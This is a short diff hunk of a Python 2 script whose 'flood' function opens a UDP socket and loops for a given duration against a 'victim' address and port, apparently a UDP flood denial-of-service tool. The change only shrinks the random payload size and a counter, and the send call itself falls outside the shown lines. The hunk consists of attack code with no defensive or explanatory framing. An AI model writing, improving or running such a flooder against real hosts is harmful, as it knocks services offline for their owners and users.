@@ -14,9 +14,9 @@ def usage():
     print "#######################################################################"
 def flood(victim, vport, duration):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    bytes = random._urandom(99999)
+    bytes = random._urandom(90000)
     timeout =  time.time() + duration
-    sent = 9999
+    sent = 9000
     while 1:
         if time.time() > timeout:
             break
